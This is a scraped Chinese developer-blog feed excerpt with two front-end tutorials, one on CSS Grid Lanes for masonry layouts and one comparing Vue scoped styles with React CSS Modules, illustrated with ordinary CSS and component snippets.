ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>大家好，我是 Immerse，一名独立开发者、内容创作者、AGI 实践者。</p>
<p>关注公众号：<a href="https://link.juejin.cn?target=https%3A%2F%2Fyaolifeng.com%2Fother%2Fwx_public_account.webp" target="_blank" title="https://yaolifeng.com/other/wx_public_account.webp" ref="nofollow noopener noreferrer">沉浸式趣谈</a>，获取最新文章（更多内容只在公众号更新）</p>
<p>个人网站：<a href="https://link.juejin.cn?target=https%3A%2F%2Fyaolifeng.com" target="_blank" title="https://yaolifeng.com" ref="nofollow noopener noreferrer">yaolifeng.com</a> 也同步更新。</p>
<p>转载请在文章开头注明出处和版权信息。</p>
<p>我会在这里分享关于<code>编程</code>、<code>独立开发</code>、<code>AI干货</code>、<code>开源</code>、<code>个人思考</code>等内容。</p>
<p>如果本文对您有所帮助，欢迎动动小手指一键三连(<code>点赞</code>、<code>评论</code>、<code>转发</code>)，给我一些支持和鼓励，谢谢！</p>
<hr/>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/64c14e37477d4f4b83cc9d639e93d6a2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSW1tZXJzZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768984906&amp;x-signature=DJWrcxDEbuGMZ3npqvsJUJHGx8U%3D" alt="" loading="lazy"/></p>
<p>之前做瀑布流布局，要么用 Masonry.js 这种库，要么自己写一堆 JavaScript 计算位置。</p>
<p>现在好了，CSS Grid Lanes 来了，三行代码就搞定。</p>
<p>Safari 技术预览版已经支持了，你现在就能试。</p>
<h2 data-id="heading-0">三行代码实现瀑布流</h2>
<p>看最简单的用法。</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.container</span> {
    <span class="hljs-attribute">display</span>: grid-lanes;
    <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-built_in">repeat</span>(auto-fill, <span class="hljs-built_in">minmax</span>(<span class="hljs-number">250px</span>, <span class="hljs-number">1</span>fr));
    <span class="hljs-attribute">gap</span>: <span class="hljs-number">16px</span>;
}
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c9542cd5b39743e18c0b8cb9590ed3c9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSW1tZXJzZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768984906&amp;x-signature=K9EZR8s8hF1804%2FS%2Fcg33FWMW14%3D" alt="" loading="lazy"/></p>
<p>就这样。</p>
<p>第一行设置 <code>display: grid-lanes</code>，告诉浏览器用 Grid Lanes 布局。</p>
<p>第二行定义列，至少 250px 宽，自动填充所有可用空间。浏览器会根据屏幕宽度决定显示几列。</p>
<p>第三行设置间距，列与列之间、卡片与卡片之间都是 16px。</p>
<p>不用写 JavaScript，不用算高度，不用考虑响应式。浏览器全帮你搞定了。</p>
<h2 data-id="heading-1">原理是什么？</h2>
<p>把它想象成堵车的高速公路。</p>
<p>每辆车都想往前挤，哪条车道空就往哪条钻。每个新卡片也一样，浏览器会把它放在最靠上的位置。</p>
<p>这样布局出来的效果和 Masonry.js 一模一样，但性能好太多了。</p>
<p>如果你要做无限滚动加载更多内容，也不用 JavaScript 控制布局了。滚到底部加载新数据，浏览器自动把新卡片摆好。</p>
<h2 data-id="heading-2">列宽可以不一样</h2>
<p>因为底层用的是 CSS Grid，你可以做各种花样。</p>
<p>比如奇数列窄，偶数列宽，最后一列始终是窄的：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.container</span> {
    <span class="hljs-attribute">display</span>: grid-lanes;
    <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-built_in">repeat</span>(auto-fill, <span class="hljs-built_in">minmax</span>(<span class="hljs-number">8rem</span>, <span class="hljs-number">1</span>fr) <span class="hljs-built_in">minmax</span>(<span class="hljs-number">16rem</span>, <span class="hljs-number">2</span>fr)) <span class="hljs-built_in">minmax</span>(<span class="hljs-number">8rem</span>, <span class="hljs-number">1</span>fr);
}
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c5a5e33fa44f428db81ccb5b4b7c1023~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSW1tZXJzZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768984906&amp;x-signature=bUnrpp1DhIeCN%2FBKlokl7ixT6uk%3D" alt="" loading="lazy"/></p>
<p>这样布局出来就有节奏感了，不会显得太死板。</p>
<h2 data-id="heading-3">卡片可以跨列</h2>
<p>既然是 Grid，那肯定能跨列。</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-tag">article</span> {
    <span class="hljs-attribute">grid-column</span>: span <span class="hljs-number">1</span>;
}

<span class="hljs-selector-tag">article</span><span class="hljs-selector-pseudo">:nth-child</span>(<span class="hljs-number">1</span>) {
    <span class="hljs-attribute">grid-column</span>: span <span class="hljs-number">4</span>;
}

<span class="hljs-selector-tag">article</span><span class="hljs-selector-pseudo">:nth-child</span>(<span class="hljs-number">2</span>),
<span class="hljs-selector-tag">article</span><span class="hljs-selector-pseudo">:nth-child</span>(<span class="hljs-number">3</span>) {
    <span class="hljs-attribute">grid-column</span>: span <span class="hljs-number">2</span>;
}
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ed8470b6b67f4a608f3dde226073ccc9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSW1tZXJzZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768984906&amp;x-signature=wEu7AQed7md7kiyPptBa%2FVob7KQ%3D" alt="" loading="lazy"/></p>
<p>第一张卡片占 4 列做头图，第 2 到第 3 张占 2 列做次要内容，其他的占 1 列。</p>
<p>这种布局以前只能用 JavaScript 计算，现在纯 CSS 就行。</p>
<p>报纸那种复杂版式也能做出来了。</p>
<h2 data-id="heading-4">固定位置也可以</h2>
<p>你还能指定某个元素放在特定位置。</p>
<p>比如把 header 固定在最右边的两列：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-tag">main</span> {
    <span class="hljs-attribute">display</span>: grid-lanes;
    <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-built_in">repeat</span>(auto-fill, <span class="hljs-built_in">minmax</span>(<span class="hljs-number">24ch</span>, <span class="hljs-number">1</span>fr));
}

<span class="hljs-selector-tag">header</span> {
    <span class="hljs-attribute">grid-column</span>: -<span class="hljs-number">3</span> / -<span class="hljs-number">1</span>;
}
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a5acbb0117c14c7fa455f435b1097fa5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSW1tZXJzZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768984906&amp;x-signature=p%2FRyUfLtG1ExQjBhIQZ5WnK9ZhQ%3D" alt="" loading="lazy"/></p>
<p>不管屏幕多宽，header 都会出现在右边。其他内容该怎么排怎么排。</p>
<h2 data-id="heading-5">横向布局也能做</h2>
<p>瀑布流是竖着流，Grid Lanes 也能横着流。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/722f59112ec04d458e2b9af3001c3d25~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSW1tZXJzZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768984906&amp;x-signature=0X1iEbx0CoZpU76iuFD%2FpegjP2M%3D" alt="" loading="lazy"/></p>
<p>竖着流用 <code>grid-template-columns</code> 定义列：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.container</span> {
    <span class="hljs-attribute">display</span>: grid-lanes;
    <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-number">1</span>fr <span class="hljs-number">1</span>fr <span class="hljs-number">1</span>fr <span class="hljs-number">1</span>fr;
}
</code></pre>
<p>横着流就用 <code>grid-template-rows</code> 定义行：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.container</span> {
    <span class="hljs-attribute">display</span>: grid-lanes;
    <span class="hljs-attribute">grid-template-rows</span>: <span class="hljs-number">1</span>fr <span class="hljs-number">1</span>fr <span class="hljs-number">1</span>fr;
}
</code></pre>
<p>浏览器会根据你定义的是列还是行，自动判断流的方向。</p>
<p>不用额外设置什么属性，它自己就知道。</p>
<h2 data-id="heading-6">容错度控制</h2>
<p>有个新概念叫容错度。</p>
<p>假设第一列的卡片高度是 100px，第四列是 99px。下一张卡片应该放哪？</p>
<p>如果追求绝对精确，应该放第四列，因为它矮 1px。</p>
<p>但这 1px 根本看不出来，而且会导致卡片顺序很乱。用户 Tab 切换时会跳来跳去。</p>
<p>所以 Grid Lanes 有个默认容错度 <code>1em</code>。只有高度差超过 1em，浏览器才会认为它们不一样。</p>
<p>小于 1em 的差异会被忽略，卡片会更倾向于从左到右排列。</p>
<p>你可以调整这个值：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.container</span> {
    item-tolerance: <span class="hljs-number">2em</span>;
}
</code></pre>
<p>设大一点，布局更规整，但可能浪费空间。设小一点，空间利用率高，但顺序会更乱。</p>
<p>根据你的内容大小和内容差异来调。</p>
<p>注意这个属性名字可能还会改，正式发布前留意一下。</p>
<h2 data-id="heading-7">现在就能试</h2>
<p>Safari 技术预览版 234 已经支持了。</p>
<p>你可以下载来试试，官方 Demo 网站也更新了新语法。</p>
<p>除了图片瀑布流，还有其他用法。</p>
<p>比如做 Mega Menu 的底部链接区域。每组链接高度不同，用 Grid Lanes 排起来非常整齐：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.container</span> {
    <span class="hljs-attribute">display</span>: grid-lanes;
    <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-built_in">repeat</span>(auto-fill, <span class="hljs-built_in">minmax</span>(max-content, <span class="hljs-number">24ch</span>));
    <span class="hljs-attribute">column-gap</span>: <span class="hljs-number">4</span>lh;
}
</code></pre>
<p>各组链接紧密排列，不会浪费空间。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/de0584f9f30248c8b67b866fbe24993d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSW1tZXJzZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768984906&amp;x-signature=XDuA8aJG9Juf4LWziWFbTdjmeVE%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-8">接下来呢</h2>
<p>CSS 工作组还有几个细节在讨论，但整体语法已经确定了。</p>
<p>现在可以学起来，可以做 Demo 玩玩，可以给反馈。</p>
<p>WebKit 团队从 2022 年中开始做这个功能，现在终于能用了。</p>
<p>我估计其他浏览器也会很快跟进，毕竟这需求太常见了。</p>
<p>以后做瀑布流，再也不用引 JavaScript 库了。</p>
<h2 data-id="heading-9">参考资料：</h2>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwebkit.org%2Fblog%2F17660%2Fintroducing-css-grid-lanes%2F" target="_blank" title="https://webkit.org/blog/17660/introducing-css-grid-lanes/" ref="nofollow noopener noreferrer">Introducing Grid Lanes</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwebkit.org%2Fdemos%2Fgrid-lanes%2F" target="_blank" title="https://webkit.org/demos/grid-lanes/" ref="nofollow noopener noreferrer">Example Gallery</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[CSS 也能“私有化”？揭秘模块化 CSS 的防坑指南（附 Vue & React 实战）]]></title>    <link>https://juejin.cn/post/7594817135128412194</link>    <guid>https://juejin.cn/post/7594817135128412194</guid>    <pubDate>2026-01-14T07:49:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594817135128412194" data-draft-id="7594835618119860264" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="CSS 也能“私有化”？揭秘模块化 CSS 的防坑指南（附 Vue &amp; React 实战）"/> <meta itemprop="keywords" content="前端,CSS,Vue.js"/> <meta itemprop="datePublished" content="2026-01-14T07:49:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="生椰丝绒拿铁"/> <meta itemprop="url" content="https://juejin.cn/user/4185180725584116"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            CSS 也能“私有化”？揭秘模块化 CSS 的防坑指南（附 Vue &amp; React 实战）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4185180725584116/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    生椰丝绒拿铁
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T07:49:37.000Z" title="Wed Jan 14 2026 07:49:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>“你改你的样式，我改我的样式，咱俩井水不犯河水。”<br/>
—— 一个被全局 CSS 折磨到秃头的前端开发者</p>
</blockquote>
<hr/>
<h2 data-id="heading-0">🌪️ 从前，有个叫“全局污染”的幽灵</h2>
<p>在前端开发的远古时代（其实也就几年前），我们写 CSS 是这样的：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.button</span> {
  <span class="hljs-attribute">background</span>: red;
}
</code></pre>
<p>然后某天，同学也写了 <code>.button</code>，但颜色是蓝色。结果——<strong>按钮变蓝了！</strong><br/>
你一脸懵：“我写的红呢？”<br/>
他更懵：“我也没动你的代码啊！”</p>
<p>这就是 <strong>CSS 全局作用域</strong> 的经典翻车现场。</p>
<p><strong>类名冲突、样式覆盖、调试到凌晨三点……</strong><br/>
于是，聪明的前端工程师们开始思考：<strong>能不能让 CSS 也像 JavaScript 一样“模块化”？</strong></p>
<p>答案是：<strong>能！而且还不止一种方式。</strong></p>
<hr/>
<h2 data-id="heading-1">🧩 模块化 CSS：给样式加上“私有锁”</h2>
<p>模块化 CSS 的核心思想很简单：<strong>每个组件的样式只对自己生效，不污染别人，也不被别人污染。</strong></p>
<p>听起来像“社恐”的理想生活状态？没错！它就是为组件化开发量身定制的“社交距离”。</p>
<p>目前主流框架提供了两种实现路径：</p>
<ul>
<li><strong>Vue：<code>scoped</code> 属性</strong></li>
<li><strong>React：CSS Modules（<code>.module.css</code>）</strong></li>
</ul>
<p>下面，咱们就来拆解这两种“防冲突神器”，顺便看看它们背后的小秘密。</p>
<hr/>
<h2 data-id="heading-2">🎭 Vue 的 <code>scoped</code>：优雅又高效</h2>
<p>在 Vue 单文件组件中，只需加个 <code>scoped</code>，就能自动隔离样式：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"txt"</span>&gt;</span>Hello World<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="css">
<span class="hljs-selector-class">.txt</span> {
  <span class="hljs-attribute">color</span>: red;
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<h3 data-id="heading-3">🔍 它是怎么做到的？</h3>
<p>Vue 并不会重命名你的类名（比如变成 <code>txt_abc123</code>），而是<strong>在编译时给每个元素加一个唯一的 <code>data-v-xxxxx</code> 属性</strong>，然后把 CSS 选择器也加上这个属性：</p>
<pre><code class="hljs language-ini" lang="ini">&lt;h1 <span class="hljs-attr">class</span>=<span class="hljs-string">"txt"</span> data-v-f3f3eg9&gt;Hello World&lt;/h1&gt;
</code></pre>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.txt</span><span class="hljs-selector-attr">[data-v-f3f3eg9]</span> {
  <span class="hljs-attribute">color</span>: red;
}
</code></pre>
<p>✅ <strong>优点</strong>：</p>
<ul>
<li>类名不变，可读性强</li>
<li>编译一次，性能好</li>
<li>写法简洁，零配置</li>
</ul>
<p>❌ <strong>小缺点</strong>：</p>
<ul>
<li>深度选择器（如修改子组件样式）需要特殊语法（<code>::v-deep</code>）</li>
<li>动态生成的 HTML（如 <code>v-html</code>）无法自动带上属性</li>
</ul>
<blockquote>
<p>就像给每个组件发了一张“门禁卡”，只有本组件的人才能进。</p>
</blockquote>
<hr/>
<h2 data-id="heading-4">🧪 React 的 CSS Modules：JS 化的样式对象</h2>
<p>React 本身不处理样式，但通过 <strong>CSS Modules</strong>，我们可以这样写：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> styles <span class="hljs-keyword">from</span> <span class="hljs-string">'./Button.module.css'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">Button</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">className</span>=<span class="hljs-string">{styles.button}</span>&gt;</span>Click me<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>;
}
</code></pre>
<p>对应的 <code>Button.module.css</code>：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.button</span> {
  <span class="hljs-attribute">background</span>: blue;
  <span class="hljs-attribute">color</span>: white;
}
</code></pre>
<h3 data-id="heading-5">🔍 背后发生了什么？</h3>
<p>Webpack（或其他打包工具）会把 <code>.module.css</code> 文件编译成一个 <strong>JS 对象</strong>：</p>
<pre><code class="hljs language-css" lang="css">// 编译后 styles 长这样
{
  <span class="hljs-selector-tag">button</span>: <span class="hljs-string">"Button_button__abc123"</span>
}
</code></pre>
<p>最终渲染的 HTML：</p>
<pre><code class="hljs language-ini" lang="ini">&lt;button <span class="hljs-attr">class</span>=<span class="hljs-string">"Button_button__abc123"</span>&gt;Click me&lt;/button&gt;
</code></pre>
<p>✅ <strong>优点</strong>：</p>
<ul>
<li>类名绝对唯一，彻底隔离</li>
<li>支持动态拼接（<code>className={</code><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>t</mi><mi>y</mi><mi>l</mi><mi>e</mi><mi>s</mi><mi mathvariant="normal">.</mi><mi>b</mi><mi>t</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">{styles.btn} </annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">es</span><span class="mord">.</span><span class="mord mathnormal">b</span><span class="mord mathnormal">t</span><span class="mord mathnormal">n</span></span></span></span></span></span>{isActive ? styles.active : ''}<code>}</code>）</li>
<li>适合大型项目、开源组件库</li>
</ul>
<p>❌ <strong>小缺点</strong>：</p>
<ul>
<li>类名被哈希化，调试时看着有点懵</li>
<li>需要手动导入，略显啰嗦</li>
</ul>
<blockquote>
<p>这就像给每个样式贴上了“身份证号”，全球唯一，永不重复。</p>
</blockquote>
<hr/>
<h2 data-id="heading-6">🤔 scoped vs CSS Modules：谁更香？</h2>



































<table><thead><tr><th>特性</th><th>Vue <code>scoped</code></th><th>React CSS Modules</th></tr></thead><tbody><tr><td>配置难度</td><td>零配置</td><td>需要构建工具支持</td></tr><tr><td>类名可读性</td><td>高（原样保留）</td><td>低（哈希化）</td></tr><tr><td>性能</td><td>高（属性选择器）</td><td>中（字符串拼接）</td></tr><tr><td>深度控制</td><td>需 <code>::v-deep</code></td><td>可直接组合类名</td></tr><tr><td>适用场景</td><td>Vue 项目首选</td><td>React / 多人协作 / 开源库</td></tr></tbody></table>
<p><strong>总结一句话</strong>：</p>
<blockquote>
<p>Vue 用 <code>scoped</code> 图省事，React 用 CSS Modules 图安全。</p>
</blockquote>
<hr/>
<h2 data-id="heading-7">💡 真实世界的建议</h2>
<ol>
<li><strong>不要混用全局 CSS 和模块化 CSS</strong><br/>
如果你在用 <code>scoped</code> 或 <code>module.css</code>，就别再在全局写 <code>.button</code> 了，否则等于给自己挖坑。</li>
<li><strong>命名依然重要</strong><br/>
即使有模块化，也别写 <code>.a</code>, <code>.b</code> 这种名字。清晰的命名 = 清晰的逻辑。</li>
<li><strong>开源组件请务必模块化</strong><br/>
别人用你的组件，最怕“样式污染”。模块化是基本礼仪！</li>
<li><strong>考虑 CSS-in-JS？</strong><br/>
如 styled-components、Emotion，它们把样式直接写在 JS 里，更极致的模块化。但这是另一个故事了……</li>
</ol>
<hr/>
<h2 data-id="heading-8">🎉 结语：CSS 也可以很“私密”</h2>
<p>从前，CSS 是开放的广场，人人可踩；<br/>
如今，CSS 是带锁的房间，各归其位。</p>
<p>模块化 CSS 不是银弹，但它<strong>极大降低了协作成本，提升了代码可维护性</strong>。<br/>
尤其在团队作战、组件复用、开源共享的今天，它早已不是“可选项”，而是<strong>必备技能</strong>。</p>
<p>所以，下次写样式前，先问自己一句：</p>
<blockquote>
<p>“这行 CSS，真的只属于我吗？”</p>
</blockquote>
